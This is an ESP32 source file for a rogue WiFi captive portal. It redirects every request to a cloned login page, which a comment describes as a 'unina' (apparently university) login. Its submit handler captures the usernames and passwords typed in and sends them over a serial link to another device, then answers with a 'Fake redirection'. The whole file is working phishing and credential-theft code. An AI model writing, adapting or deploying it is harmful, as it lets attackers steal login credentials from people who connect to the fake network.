#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <SPIFFS.h> 

#include "web_handler.h"

void setup_web_handler() {
    http_server.on("/", main_handler);
    http_server.on("/submit", submit_handler);
    http_server.onNotFound(captive_portal);

    // file handlers for use html page from files
    http_server.serveStatic("/style.css", SPIFFS, "/style.css");
    http_server.serveStatic("/script.js", SPIFFS, "/script.js");
    http_server.serveStatic("/logo.jpg", SPIFFS, "/logo.jpg");
    http_server.serveStatic("/background.jpg", SPIFFS, "/background.jpg");
}

void captive_portal() {   
    http_server.sendHeader("Location", String("http://") + WiFi.softAPIP().toString(), true);
    http_server.send(302, "text/plain", ""); 
}

void main_handler() {
  
    // code to load unina login page from file
    File file = SPIFFS.open("/index.html", "r");
    if (!file || file.isDirectory()) {
        http_server.send(404, "text/plain", "Login page not found");
        return;
    }
    http_server.streamFile(file, "text/html");
    file.close();
    
}

void submit_handler() {
    if (http_server.method() == HTTP_POST) {
        String username = http_server.arg("username");
        String password = http_server.arg("password");

        Serial.print("[CREDENTIALS] Username: ");
        Serial.println(username);
        Serial.print("[CREDENTIALS] Password: ");
        Serial.println(password);

        String to_transmit = username + " - " + password + "\n";
        Serial.print("[CREDENTIALS] Sending acquired data: ");
        Serial.print(to_transmit);
        Serial1.print(to_transmit);   // send credentials over usart

        http_server.sendHeader("Location", "/");
        http_server.send(302, "text/plain", "Fake redirection");
    } else {
        http_server.send(405, "text/plain", "Method Not Allowed");
    }
}
